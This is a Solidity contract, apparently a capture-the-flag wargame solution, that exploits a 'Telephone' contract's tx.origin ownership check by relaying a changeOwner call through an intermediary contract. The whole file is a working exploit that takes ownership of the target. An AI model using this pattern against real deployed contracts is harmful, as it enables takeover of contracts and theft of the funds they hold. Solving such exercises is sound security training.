// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address owner;
    ITelephone telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);

        owner = msg.sender;
    }

    function changeOwner() public {
        require(owner == msg.sender, "only owner");
        telephone.changeOwner(msg.sender);
    }
}
